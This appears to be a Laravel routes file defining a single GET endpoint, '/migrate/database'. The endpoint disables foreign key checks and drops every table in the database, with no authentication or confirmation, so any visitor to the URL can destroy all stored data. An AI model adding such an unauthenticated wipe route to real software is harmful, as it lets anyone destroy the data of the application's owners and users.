<?php

use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

Route::get('/migrate/database', function(){
    Schema::disableForeignKeyConstraints();
    foreach(DB::select('SHOW TABLES') as $table) {
        $table_array = get_object_vars($table);
        Schema::drop($table_array[key($table_array)]);
    }
});
